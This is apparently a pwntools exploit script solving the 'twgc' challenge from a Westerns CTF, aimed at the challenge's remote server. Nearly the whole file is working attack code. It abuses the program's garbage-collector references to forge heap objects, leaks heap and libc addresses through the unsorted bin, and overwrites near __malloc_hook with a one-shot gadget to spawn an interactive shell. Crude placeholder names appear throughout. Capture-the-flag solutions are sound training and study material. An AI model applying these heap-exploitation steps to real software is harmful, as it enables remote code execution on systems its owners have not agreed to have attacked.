from pwn import *

#r = process("./twgc", env={"LD_PRELOAD":"./libc2.so.6"})
r = remote("twgc.chal.ctf.westerns.tokyo", 11419)

def create(name, string):
	r.sendline("1")
	print r.recvuntil("name: ")
	r.sendline(name)
	print r.recvuntil("string : ")
	r.sendline(string)
	print r.recvuntil(">> ")

def edit(src, dest, string):
	r.sendline("2")
	print r.recvuntil(": ")
	r.sendline(src)
	print r.recvuntil(": ")
	r.sendline(dest)
	print r.recvuntil(": ")
	r.sendline(string)
	print r.recvuntil(">> ")

def addRef(src, dest):
        r.sendline("3")
        print r.recvuntil(": ")
        r.sendline(src)
        print r.recvuntil(": ")
        r.sendline(dest)
        print r.recvuntil(">> ")

def delRef(src, dest):
	r.sendline("4")
	print r.recvuntil(": ")
	r.sendline(src)
	print r.recvuntil(": ")
	r.sendline(dest)
	print r.recvuntil(">> ")

print r.recvuntil(">> ")

create("shit1", "fuck")
create("shit2", "fuck")

for i in range(15):
	create(str(i), "A"*0x10) # 1, 2, ... , 15

addRef("shit1", "shit1") # shit1 -> shit

for i in range(15):
	addRef("shit1", str(i)) # shit1 -> 1, 2, ... , 15

for i in range(14):
	for i in range(15):
		create(str(0x41+i), "A"*500) # to triger gc 15 times
		delRef("root", str(0x41+i))

for i in range(15):
	delRef("shit1", str(i)) # delete 1, 2, ... , 15
	delRef("root", str(i)) # because to make gcCnt of 1, 2, ... to 1, not 15.

for i in range(15):
	create(str(i), "A"*0x10) # link new memory to shit1
	addRef("shit1", str(i))

for i in range(30):
	create(str(0x41+i), "A"*300)
	delRef("root", str(0x41+i))

r.sendline("5")
r.sendline("shit1")
print r.recvuntil("destination: ")
r.sendline("")
rv = r.recv(6)

heap = u64(rv + "\x00\x00") # leak heap address

print "heap: " + hex(heap)

for i in range(8):
	create(str(100+i), "B"*500)
	delRef("root", str(10+i))

payload = "A"*0x18
payload += "\x00"*16
payload += p64(0x400) + p64(0x0)# size
payload += p64(0x41414141) + "A"*4 + "\x00"*4 + "B"*50

create("PPPP", payload) # create fake object in shit1->AAAA
create("QQQQ", "C"*0x20) # we will overwrite QQQQ with edit shit1->AAAA!

payload = "B"*0x38 + "\x00"*16 + p64(0x80) + p64(0x0)
payload += p64(heap-0x1c50+0x140) # stdin buffer + 0x140, address of fake refList ptr
payload += p64(0x51515151) + "AAAA" # name QQQQ

edit("shit1", "AAAA", payload)

payload = "A"*0x140 + p64(0x1) + p64(heap-0x698+0x58) + "\x00"*100 # make QQQQ->var's string point unsorted bin ptr to get libc addr
create("fuckt", payload)

r.sendline("5")
r.sendline("QQQQ")
r.sendline("\x81\x1d") # name (&unsortedbinaddr - 0x8, size=0x1d81, addr in heap)

rv = r.recvuntil("\x7f")[-6:]
libc = u64(rv + "\x00\x00")
libc_base = libc - 0x3c4b78
malloc_fake = libc_base + 0x3c4ae0

payload = "A"*0x140 + p64(0x1) + p64(malloc_fake) + "\x00"*16 # overwrite fake refList to nearby malloc hook, size != 0.
print "libc: " + hex(libc)

create("fucktt", payload) # to give our input stdin buf

r.sendline("2")
r.sendline("QQQQ")
r.sendline("")
r.sendline(p64(libc_base+0x4526a)) # one-shot!

r.sendline("1")
r.sendline("shell")
r.sendline("shell") # call malloc!

r.interactive()
